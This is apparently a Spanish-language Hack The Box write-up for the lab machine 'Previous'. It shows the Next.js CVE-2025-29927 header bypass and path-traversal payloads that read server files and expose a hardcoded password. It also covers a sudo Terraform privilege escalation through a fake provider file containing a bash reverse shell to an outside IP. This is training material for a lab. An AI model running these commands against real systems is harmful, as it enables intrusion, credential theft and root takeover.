---
layout: post
title: Previous - Hack The Box
date: 2025-10-31
categories: [Hack The Box, Linux]
tags:  [Linux, Web, FuzzLFI, SUDO, Terraform, LFI, CVE, NextJS, SUDOERS]
image:
  path: htb-writeup-previous/previous.png
  alt: previous
---

![logo](htb-writeup-previous/previous-logo.png){: .right w="200" h="200" }

La maquina `PREVIOUS` de Hack The Box es un entorno de dificultad media que toca una vulnerabilidad de NextJS reciente en el 2025 catalogada como `CVE-2025-29927` esta nos permitio bypassear endpoints de la aplicacion y encontrar credenciales de acceso por ssh. Una vez dentro del sistema enumeramos bien para encontrar alguna via de escalada sin embargo nos encontramos con un binario que se puede ejecutar como ROOT (con privilegios SUDO), entendiendo el funcionamiento de `TERRAFORM` nos vimos obligados a leer la documentacion y asi escalamos a root.

## Reconocimiento

### Nmap

Como primera medidad nos vamos a encargar de realizar un escaneo rapido y preciso con `nmap`

```bash
nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn 10.10.11.83
Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 14:04 CET
Initiating SYN Stealth Scan at 14:04
Scanning 10.10.11.83 [65535 ports]
Discovered open port 22/tcp on 10.10.11.83
Discovered open port 80/tcp on 10.10.11.83
Completed SYN Stealth Scan at 14:04, 15.06s elapsed (65535 total ports)
Nmap scan report for 10.10.11.83
Host is up, received user-set (0.18s latency).
Scanned at 2025-10-31 14:04:38 CET for 15s
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 63

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 15.15 seconds
           Raw packets sent: 73488 (3.233MB) | Rcvd: 73486 (2.939MB)
```

- PORT 22
  + SSH

- PORT 80
  + HTTP

El escaneo nos muestra 2 puertos abiertos, son los tipicos puertos que nos encontramos en una maquina de HTB... Ya sabemos que la intrusion puede ser por `SSH`

### Nmap Servicios y Puertos

```bash
nmap -p22,80 -sCV 10.10.11.83
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-31 14:08 CET
Nmap scan report for 10.10.11.83
Host is up (0.21s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.9p1 Ubuntu 3ubuntu0.13 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 3e:ea:45:4b:c5:d1:6d:6f:e2:d4:d1:3b:0a:3d:a9:4f (ECDSA)
|_  256 64:cc:75:de:4a:e6:a5:b4:73:eb:3f:1b:cf:b4:e3:94 (ED25519)
80/tcp open  http    nginx 1.18.0 (Ubuntu)
|_http-title: Did not follow redirect to http://previous.htb/
|_http-server-header: nginx/1.18.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 19.45 seconds
```

Para ver a que nos estamos enfrentado es bueno saber escanear los servicios que corren en cada puerto. Tambien vemos un dominio `previous.htb`, esto vamos a escribirlo en nuestro `/etc/hosts`.

```bash
echo "10.10.11.83 previous.htb" >> /etc/hosts
```

## Web

![](htb-writeup-previous/previous1.png)

Esta es la web que corre por el puerto 80, si le pasamos un escaneo rapido con `wappalayzer` nos salen estas tecnologias... `Next.js`, `React`.

- PreviousJS
  + Next.js en su version 15.2.2

Antes de empezar a cazar esta amenaza buscando y investigando sobre la version de `Next.JS`, podemos observar que esta web es estatica hasta que le damos click al boton `Get Started` esta accion nos reenvia a un panel de login que se encuentra en una `API`

![](htb-writeup-previous/previous2.png)

### Enumeracion Web Fuzz

```bash
# Dirsearch started Sat Aug 30 18:25:55 2025 as: /usr/lib/python3/dist-packages/dirsearch/dirsearch.py -u http://previous.htb/api -H x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware

308    22B   http://previous.htb/api/%2e%2e//google.com    -> REDIRECTS TO: /api/%2E%2E/google.com
400    64B   http://previous.htb/api/auth/adm
400    64B   http://previous.htb/api/auth/login
400    64B   http://previous.htb/api/auth/admin
400    64B   http://previous.htb/api/auth/login.aspx
400    64B   http://previous.htb/api/auth/login.php
400    64B   http://previous.htb/api/auth/login.html
400    64B   http://previous.htb/api/auth/login.js
400    64B   http://previous.htb/api/auth/login.jsp
400    64B   http://previous.htb/api/auth/logon
302     0B   http://previous.htb/api/auth/signin    -> REDIRECTS TO: /signin?callbackUrl=http%3A%2F%2Flocalhost%3A3000
308    23B   http://previous.htb/api/axis//happyaxis.jsp    -> REDIRECTS TO: /api/axis/happyaxis.jsp
308    28B   http://previous.htb/api/axis2-web//HappyAxis.jsp    -> REDIRECTS TO: /api/axis2-web/HappyAxis.jsp
308    34B   http://previous.htb/api/axis2//axis2-web/HappyAxis.jsp    -> REDIRECTS TO: /api/axis2/axis2-web/HappyAxis.jsp
308    56B   http://previous.htb/api/Citrix//AccessPlatform/auth/clientscripts/cookies.js    -> REDIRECTS TO: /api/Citrix/AccessPlatform/auth/clientscripts/cookies.js
400    28B   http://previous.htb/api/download
308    46B   http://previous.htb/api/engine/classes/swfupload//swfupload_f9.swf    -> REDIRECTS TO: /api/engine/classes/swfupload/swfupload_f9.swf
308    43B   http://previous.htb/api/engine/classes/swfupload//swfupload.swf    -> REDIRECTS TO: /api/engine/classes/swfupload/swfupload.swf
308    31B   http://previous.htb/api/extjs/resources//charts.swf    -> REDIRECTS TO: /api/extjs/resources/charts.swf
308    41B   http://previous.htb/api/html/js/misc/swfupload//swfupload.swf    -> REDIRECTS TO: /api/html/js/misc/swfupload/swfupload.swf
```

En esta maquina vamos a usar la herramienta `dirsearch`, es parecida a `feroxbuster`. Estas herramientas son geniales porque agiliza el fuzzeo en muchos sentidos.

En este reporte que nos deja dirsearch podemos encontrar `/api/download`, quiero ver de que se trata este endpoint.

```bash
curl -s "http://previous.htb/api/download" -I
HTTP/1.1 307 Temporary Redirect
Server: nginx/1.18.0 (Ubuntu)
Date: Fri, 31 Oct 2025 13:39:15 GMT
Connection: keep-alive
location: /api/auth/signin?callbackUrl=%2Fapi%2Fdownload
```

Cuando realizamos un curl nos redirige a `/api/auth/signin?callbackUrl=%2Fapi%2Fdownload`, en este punto ya es hora de indagar por la version de `Next.JS`

### CVE-2025-29927

BIEN!!! Existe un CVE para esta version de `Next.JS`

Las versiones afectadas de este paquete son vulnerables a una autorización incorrecta debido al manejo inadecuado de la cabecera `x-middleware-subrequest`. Un atacante puede eludir las comprobaciones de autorización enviando solicitudes manipuladas que contengan esta cabecera específica.

Comparto el PoC esta vulnerabilidad de [Next.JS](https://github.com/lirantal/vulnerable-nextjs-14-CVE-2025-29927)

Para que se entienda mejor la vuln, si enjaulamos en una cabezera 5 veces `x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware` podremos bypassear el endpoint `/api/download` y ver su contenido sin estar registrado o tener alguna credencial de acceso.

```bash
curl -s "http://previous.htb/api/download" -H 'x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware' | jq
{
  "error": "Invalid filename"
}
```

Excelente, parece que esta funcionando!!!... Antes solo veiamos un `ERROR 307`, ahora vemos un `invalid filename` esto quiere decir que estamos logrando bypassear las restricciones.

Lo que se me ocurre en este punto es fuzzear por parametros validos.

```bash
ffuf -u 'http://previous.htb/api/download?FUZZ=aaa' -w AllParam.txt -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" -mc all -fw 2

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://previous.htb/api/download?FUZZ=aaa
 :: Wordlist         : FUZZ: /home/mrincreible/HTB/previous/AllParam.txt
 :: Header           : X-Middleware-Subrequest: middleware:middleware:middleware:middleware:middleware
 :: Follow redirects : false
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: all
 :: Filter           : Response words: 2
________________________________________________

example                 [Status: 404, Size: 26, Words: 3, Lines: 1, Duration: 322ms]
:: Progress: [7083/74332] :: Job [1/1] :: 211 req/sec :: Duration: [0:00:35] :: Errors: 0 ::
```

Muy bien!. Encontramos un parametro valido `example`. Si este parametro es correcto entonces puedo probar con algun diccionario para buscar algun `LFI` ya que el endpoint esta tratando de tomar algun archivo.

```bash
wfuzz -c --hc=404,504 -t 100 -w lfi.txt -u 'http://previous.htb/api/download?example=FUZZ' -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
```

Con wfuzz construi este comando para incluir archivos del sistema y derivarlo a un LFI.

```bash
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://previous.htb/api/download?example=FUZZ
Total requests: 70466

=====================================================================
ID           Response   Lines    Word       Chars       Payload                                                                                                    
=====================================================================

000000281:   200        19 L     19 W       787 Ch      "..%2f..%2f..%2f/etc/passwd"                                                                               
000000298:   200        19 L     19 W       787 Ch      "%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd"                                                          
000000282:   200        19 L     19 W       787 Ch      "..%2f..%2f..%2f..%2f/etc/passwd"
```

si copiamos este `%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd` o cualquiera de esos payloads.

```bash
curl -s "http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/etc/passwd" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
root:x:0:0:root:/root:/bin/sh
bin:x:1:1:bin:/bin:/sbin/nologin
daemon:x:2:2:daemon:/sbin:/sbin/nologin
lp:x:4:7:lp:/var/spool/lpd:/sbin/nologin
sync:x:5:0:sync:/sbin:/bin/sync
shutdown:x:6:0:shutdown:/sbin:/sbin/shutdown
halt:x:7:0:halt:/sbin:/sbin/halt
mail:x:8:12:mail:/var/mail:/sbin/nologin
news:x:9:13:news:/usr/lib/news:/sbin/nologin
uucp:x:10:14:uucp:/var/spool/uucppublic:/sbin/nologin
cron:x:16:16:cron:/var/spool/cron:/sbin/nologin
ftp:x:21:21::/var/lib/ftp:/sbin/nologin
sshd:x:22:22:sshd:/dev/null:/sbin/nologin
games:x:35:35:games:/usr/games:/sbin/nologin
ntp:x:123:123:NTP:/var/empty:/sbin/nologin
guest:x:405:100:guest:/dev/null:/sbin/nologin
nobody:x:65534:65534:nobody:/:/sbin/nologin
node:x:1000:1000::/home/node:/bin/sh
nextjs:x:1001:65533::/home/nextjs:/sbin/nologin
```

Logramos ver el `/etc/passwd`

Cuando logramos conseguir incluir archivos del servidor, es importante seguir una metodologia a la hora de buscar archivos. Como por ejemplo el `/etc/passwd`, `/proc/self/environ`, `/etc/hosts`

```bash
curl -s "http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/proc/self/environ" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" --output -; echo
NODE_VERSION=18.20.8HOSTNAME=0.0.0.0YARN_VERSION=1.22.22SHLVL=1PORT=3000HOME=/home/nextjsPATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/binNEXT_TELEMETRY_DISABLED=1PWD=/appNODE_ENV=production
```

Observamos en las variables de entorno que es un proyecto de nextjs que se encuentra en `/app`. Quiero saber cuales son las rutas que construye `NextJS`

Para ahorrar el tiempo de busqueda me tome el trabajo de buscar el archivo que define las rutas de un proyecto en `Nextjs`

El archivo `.next/routes-manifest.json` sirve para que Next.js almacene y comunique información sobre las rutas de su aplicación web de manera optimizada. Este archivo en formato JSON proporciona metadatos que ayudan al framework a entender la estructura de enrutamiento de la aplicación, lo cual es crucial para las funciones de pre-renderizado y optimización del rendimiento.

```bash
curl -s "http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/app/.next/routes-manifest.json" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" | jq
{
  "version": 3,
  "pages404": true,
  "caseSensitive": false,
  "basePath": "",
  "redirects": [
    {
      "source": "/:path+/",
      "destination": "/:path+",
      "internal": true,
      "statusCode": 308,
      "regex": "^(?:/((?:[^/]+?)(?:/(?:[^/]+?))*))/$"
    }
  ],
  "headers": [],
  "dynamicRoutes": [
    {
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "routeKeys": {
        "nxtPnextauth": "nxtPnextauth"
      },
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
    },
    {
      "page": "/docs/[section]",
      "regex": "^/docs/([^/]+?)(?:/)?$",
      "routeKeys": {
        "nxtPsection": "nxtPsection"
      },
      "namedRegex": "^/docs/(?<nxtPsection>[^/]+?)(?:/)?$"
    }
  ],
  "staticRoutes": [
    {
      "page": "/",
      "regex": "^/(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/(?:/)?$"
    },
    {
      "page": "/docs",
      "regex": "^/docs(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs(?:/)?$"
    },
    {
      "page": "/docs/components/layout",
      "regex": "^/docs/components/layout(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/layout(?:/)?$"
    },
    {
      "page": "/docs/components/sidebar",
      "regex": "^/docs/components/sidebar(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/components/sidebar(?:/)?$"
    },
    {
      "page": "/docs/content/examples",
      "regex": "^/docs/content/examples(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/examples(?:/)?$"
    },
    {
      "page": "/docs/content/getting-started",
      "regex": "^/docs/content/getting\\-started(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/docs/content/getting\\-started(?:/)?$"
    },
    {
      "page": "/signin",
      "regex": "^/signin(?:/)?$",
      "routeKeys": {},
      "namedRegex": "^/signin(?:/)?$"
    }
  ],
  "dataRoutes": [],
  "rsc": {
    "header": "RSC",
    "varyHeader": "RSC, Next-Router-State-Tree, Next-Router-Prefetch, Next-Router-Segment-Prefetch",
    "prefetchHeader": "Next-Router-Prefetch",
    "didPostponeHeader": "x-nextjs-postponed",
    "contentTypeHeader": "text/x-component",
    "suffix": ".rsc",
    "prefetchSuffix": ".prefetch.rsc",
    "prefetchSegmentHeader": "Next-Router-Segment-Prefetch",
    "prefetchSegmentSuffix": ".segment.rsc",
    "prefetchSegmentDirSuffix": ".segments"
  },
  "rewriteHeaders": {
    "pathHeader": "x-nextjs-rewritten-path",
    "queryHeader": "x-nextjs-rewritten-query"
  },
  "rewrites": []
}
```

Si grepeamos por `api` para agilizar esto

```bash
curl -s "http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/app/.next/routes-manifest.json" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware" | jq | grep "/api"
      "page": "/api/auth/[...nextauth]",
      "regex": "^/api/auth/(.+?)(?:/)?$",
      "namedRegex": "^/api/auth/(?<nxtPnextauth>.+?)(?:/)?$"
```

Tambien encontramos mas informacion sobre un directorio `.next/server`

`.next/server` contiene archivos de servidor generados por Next.js, como el código para el renderizado del lado del servidor y las API routes, que son esenciales para ejecutar tu aplicación web en el servidor y mejorar el rendimiento y el SEO. Estos archivos no son para uso directo por parte del desarrollador, sino que son gestionados automáticamente por el framework.

```bash
/app/.next
├── build-manifest.json
├── prerender-manifest.json
├── server/
│   ├── pages/
│   │   └── api/
│   └── app/
├── static/
    └── chunks/
├── cache/
└── routes-manifest.json
```

Despleagamos un proyecto basico para saber cuales son las rutas.

Luego de saber las rutas nos acoplamos a seguir tratando de sacar el codigo fuente.

```bash
curl -s "http://previous.htb/api/download?example=%2e%2e%2f%2e%2e%2f%2e%2e%2f%2e%2e%2f/app/.next/server/pages/api/auth/%5B...nextauth%5D.js" -H "x-middleware-subrequest: middleware:middleware:middleware:middleware:middleware"
"use strict";(()=>{var e={};e.id=651,e.ids=[651],e.modules={3480:(e,n,r)=>{e.exports=r(5600)},5600:e=>{e.exports=require("next/dist/compiled/next-server/pages-api.runtime.prod.js")},6435:(e,n)=>{Object.defineProperty(n,"M",{enumerable:!0,get:function(){return function e(n,r){return r in n?n[r]:"then"in n&&"function"==typeof n.then?n.then(n=>e(n,r)):"function"==typeof n&&"default"===r?n:void 0}}})},8667:(e,n)=>{Object.defineProperty(n,"A",{enumerable:!0,get:function(){return r}});var r=function(e){return e.PAGES="PAGES",e.PAGES_API="PAGES_API",e.APP_PAGE="APP_PAGE",e.APP_ROUTE="APP_ROUTE",e.IMAGE="IMAGE",e}({})},9832:(e,n,r)=>{r.r(n),r.d(n,{config:()=>l,default:()=>P,routeModule:()=>A});var t={};r.r(t),r.d(t,{default:()=>p});var a=r(3480),s=r(8667),i=r(6435);let u=require("next-auth/providers/credentials"),o={session:{strategy:"jwt"},providers:[r.n(u)()({name:"Credentials",credentials:{username:{label:"User",type:"username"},password:{label:"Password",type:"password"}},authorize:async e=>e?.username==="jeremy"&&e.password===(process.env.ADMIN_SECRET??"MyNameIsJeremyAndILovePancakes")?{id:"1",name:"Jeremy"}:null})],pages:{signIn:"/signin"},secret:process.env.NEXTAUTH_SECRET},d=require("next-auth"),p=r.n(d)()(o),P=(0,i.M)(t,"default"),l=(0,i.M)(t,"config"),A=new a.PagesAPIRouteModule({definition:{kind:s.A.PAGES_API,page:"/api/auth/[...nextauth]",pathname:"/api/auth/[...nextauth]",bundlePath:"",filename:""},userland:t})}};var n=require("../../../webpack-api-runtime.js");n.C(e);var r=n(n.s=9832);module.exports=r})();
```

Este codigo podemos embellecerlo con esto [Embellecedor](https://beautifier.io/)

```javascript
"use strict";
(() => {
    var e = {};
    e.id = 651, e.ids = [651], e.modules = {
        3480: (e, n, r) => {
            e.exports = r(5600)
        },
        5600: e => {
            e.exports = require("next/dist/compiled/next-server/pages-api.runtime.prod.js")
        },
        6435: (e, n) => {
            Object.defineProperty(n, "M", {
                enumerable: !0,
                get: function() {
                    return function e(n, r) {
                        return r in n ? n[r] : "then" in n && "function" == typeof n.then ? n.then(n => e(n, r)) : "function" == typeof n && "default" === r ? n : void 0
                    }
                }
            })
        },
        8667: (e, n) => {
            Object.defineProperty(n, "A", {
                enumerable: !0,
                get: function() {
                    return r
                }
            });
            var r = function(e) {
                return e.PAGES = "PAGES", e.PAGES_API = "PAGES_API", e.APP_PAGE = "APP_PAGE", e.APP_ROUTE = "APP_ROUTE", e.IMAGE = "IMAGE", e
            }({})
        },
        9832: (e, n, r) => {
            r.r(n), r.d(n, {
                config: () => l,
                default: () => P,
                routeModule: () => A
            });
            var t = {};
            r.r(t), r.d(t, {
                default: () => p
            });
            var a = r(3480),
                s = r(8667),
                i = r(6435);
            let u = require("next-auth/providers/credentials"),
                o = {
                    session: {
                        strategy: "jwt"
                    },
                    providers: [r.n(u)()({
                        name: "Credentials",
                        credentials: {
                            username: {
                                label: "User",
                                type: "username"
                            },
                            password: {
                                label: "Password",
                                type: "password"
                            }
                        },
                        authorize: async e => e?.username === "jeremy" && e.password === (process.env.ADMIN_SECRET ?? "MyNameIsJeremyAndILovePancakes") ? {
                            id: "1",
                            name: "Jeremy"
                        } : null
                    })],
                    pages: {
                        signIn: "/signin"
                    },
                    secret: process.env.NEXTAUTH_SECRET
                },
                d = require("next-auth"),
                p = r.n(d)()(o),
                P = (0, i.M)(t, "default"),
                l = (0, i.M)(t, "config"),
                A = new a.PagesAPIRouteModule({
                    definition: {
                        kind: s.A.PAGES_API,
                        page: "/api/auth/[...nextauth]",
                        pathname: "/api/auth/[...nextauth]",
                        bundlePath: "",
                        filename: ""
                    },
                    userland: t
                })
        }
    };
    var n = require("../../../webpack-api-runtime.js");
    n.C(e);
    var r = n(n.s = 9832);
    module.exports = r
})();
```

Este es nuestro resulado, si buscamos bien a simple vista conseguimos unas credenciales para el usuario `jeremy`, podriamos probar este pass para conectarnos por ssh y obtener una shell.

```bash
MyNameIsJeremyAndILovePancakes
```

## Escalada de Privilegios

### Shell como Jeremy

Ya obtuvimos una shell como jeremy, vamos a realizar una enumeracion basica del sistema para saber donde estamos parados y que podemos encontrar para escalar privilegios o escalar a otro usuaro con permisos.

### Puertos Internos

```bash
jeremy@previous:~$ netstat -tnlp
(Not all processes could be identified, non-owned process info
 will not be shown, you would have to be root to see it all.)
Active Internet connections (only servers)
Proto Recv-Q Send-Q Local Address           Foreign Address         State       PID/Program name    
tcp        0      0 0.0.0.0:80              0.0.0.0:*               LISTEN      -                   
tcp        0      0 0.0.0.0:22              0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.53:53           0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:3000          0.0.0.0:*               LISTEN      -                   
tcp        0      0 127.0.0.1:33779         0.0.0.0:*               LISTEN      -                   
tcp6       0      0 :::80                   :::*                    LISTEN      -                   
tcp6       0      0 :::22                   :::*                    LISTEN      -
```
### Hostname

```bash
jeremy@previous:~$ hostname -I
10.10.11.83 172.18.0.1 172.17.0.1 
```

### lsb_release

```bash
jeremy@previous:~$ lsb_release -a
No LSB modules are available.
Distributor ID:	Ubuntu
Description:	Ubuntu 22.04.5 LTS
Release:	22.04
Codename:	jammy
```

### Procesos en segundo plano

![](htb-writeup-previous/previous3.png)

Vemos que existe un contenedor docker hosteando el proyecto, ahora veo porque la interface `172.18.0.1` y `172.17.0.1`

### Crontab

```bash
jeremy@previous:~$ cat /etc/crontab
# /etc/crontab: system-wide crontab
# Unlike any other crontab you don't have to run the `crontab'
# command to install the new version when you edit this file
# and files in /etc/cron.d. These files also have username fields,
# that none of the other crontabs do.

SHELL=/bin/sh
# You can also override PATH, but by default, newer versions inherit it from the environment
#PATH=/usr/local/sbin:/usr/local/bin:/sbin:/bin:/usr/sbin:/usr/bin

# Example of job definition:
# .---------------- minute (0 - 59)
# |  .------------- hour (0 - 23)
# |  |  .---------- day of month (1 - 31)
# |  |  |  .------- month (1 - 12) OR jan,feb,mar,apr ...
# |  |  |  |  .---- day of week (0 - 6) (Sunday=0 or 7) OR sun,mon,tue,wed,thu,fri,sat
# |  |  |  |  |
# *  *  *  *  * user-name command to be executed
17 *	* * *	root    cd / && run-parts --report /etc/cron.hourly
25 6	* * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.daily )
47 6	* * 7	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.weekly )
52 6	1 * *	root	test -x /usr/sbin/anacron || ( cd / && run-parts --report /etc/cron.monthly )
#
```

No existe ninguna tarea cron programada

### SUDO

PERO!!!!! Si existe un permiso a nivel de `SUDOERS`

```bash
jeremy@previous:~$ sudo -l
Matching Defaults entries for jeremy on previous:
    !env_reset, env_delete+=PATH, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jeremy may run the following commands on previous:
    (root) /usr/bin/terraform -chdir\=/opt/examples apply
```

Que es Terraform?

/usr/bin/terraform es la ruta de acceso a la ejecutable de línea de comandos (CLI) de Terraform, una herramienta de código abierto para la gestión de infraestructura como código (IaC). Esta ruta indica que el programa se ha instalado en un sistema Linux (o similar) en el directorio estándar para ejecutables del sistema

Herramienta IaC: Terraform se utiliza para definir, aprovisionar y gestionar la infraestructura (servidores, bases de datos, redes) a través de archivos de configuración escritos en un lenguaje declarativo llamado HCL (HashiCorp Configuration Language).

En la carpeta `/opt/examples` existe un archivo `main.tf` que significa?, Es el punto de entrada principal para la configuración de infraestructura en Terraform. Contiene los bloques de recursos que definen los recursos de infraestructura que se van a crear, como máquinas virtuales, bases de datos y redes.

```bash
jeremy@previous:~$ cat /opt/examples/main.tf 
terraform {
  required_providers {
    examples = {
      source = "previous.htb/terraform/examples"
    }
  }
}

variable "source_path" {
  type = string
  default = "/root/examples/hello-world.ts"

  validation {
    condition = strcontains(var.source_path, "/root/examples/") && !strcontains(var.source_path, "..")
    error_message = "The source_path must contain '/root/examples/'."
  }
}

provider "examples" {}

resource "examples_example" "example" {
  source_path = var.source_path
}

output "destination_path" {
  value = examples_example.example.destination_path
}
```

En la documentacion se puede buscar por variables de enforno que podamos alterar para controlar el archivo de configuracion. [Terraform_DOCS](https://developer.hashicorp.com/terraform/cli/config/environment-variables#tf_cli_config_file)

Lo primero que haremos sera crear un archivo asi:

```bash
jeremy@previous:~/privesc$ cat terraform-provider-examples_v0.1_linux_amd64 
#!/bin/bash

bash -i >& /dev/tcp/10.10.16.8/443 0>&1
```

`dev_overrides` apunta al directorio donde se encuentra nuestro archivo que creamos `terraform-provider-examples_v1.0_linux_amd64` 

```bash
jeremy@previous:~/privesc$ cat dev.tfrc 
provider_installation {
  dev_overrides {
    "previous.htb/terraform/examples" = "/home/jeremy/privesc"
  }
  direct {}
}
```

LUEGO!!!

```bash
export TF_CLI_CONFIG_FILE="/home/jeremy/privesc/dev.tfrc"
sudo /usr/bin/terraform -chdir\=/opt/examples apply
```

![](htb-writeup-previous/previous4.png)



